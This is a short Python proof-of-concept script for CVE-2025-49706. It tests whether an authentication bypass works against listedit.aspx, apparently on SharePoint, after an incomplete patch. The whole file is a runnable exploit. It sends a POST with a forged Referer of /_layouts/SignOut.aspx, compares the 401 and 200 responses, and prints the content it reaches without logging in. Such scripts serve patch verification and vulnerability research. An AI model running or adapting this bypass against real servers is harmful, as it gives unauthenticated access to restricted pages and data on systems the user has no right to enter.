#!/usr/bin/env python3
# Proof-of-Concept: Authentication Bypass via listedit.aspx
# CVE-2025-49706 - Incomplete Patch
# 
# This PoC demonstrates that the v2 patch only blocks ToolPane.aspx,
# but the same authentication bypass technique works on other .aspx pages.
#
# Usage: python3 poc_bypass_listedit.py --url http://10.10.10.166

import argparse
import requests

def main():
    parser = argparse.ArgumentParser(description="PoC: Auth bypass via listedit.aspx")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://10.10.10.166)")
    args = parser.parse_args()
    
    base_url = args.url.rstrip("/")
    
    # Test 1: Without bypass technique (should fail with 401)
    print("[*] Test 1: Accessing listedit.aspx WITHOUT bypass technique")
    target = f"{base_url}/_layouts/15/listedit.aspx"
    headers_normal = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    response = requests.post(target, headers=headers_normal, data="test=data", timeout=10)
    print(f"    Status: {response.status_code}")
    print(f"    Result: {'BLOCKED (Expected)' if response.status_code == 401 else 'UNEXPECTED'}")
    
    # Test 2: With bypass technique (should succeed with 200)
    print("\n[*] Test 2: Accessing listedit.aspx WITH bypass technique")
    print("    Using: Referer: /_layouts/SignOut.aspx")
    headers_bypass = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Referer": "/_layouts/SignOut.aspx",  # Auth bypass trigger
        "Content-Type": "application/x-www-form-urlencoded"
    }
    response = requests.post(target, headers=headers_bypass, data="test=data", timeout=10)
    print(f"    Status: {response.status_code}")
    print(f"    Result: {'AUTHENTICATION BYPASSED!' if response.status_code == 200 else 'Blocked'}")
    
    if response.status_code == 200:
        print(f"\n[+] SUCCESS: Authentication bypass confirmed!")
        print(f"[+] Accessed restricted page without authentication")
        print(f"[+] Response length: {len(response.text)} bytes")
        print(f"\n[*] Response preview (first 300 chars):")
        print(response.text[:300])

if __name__ == "__main__":
    main()
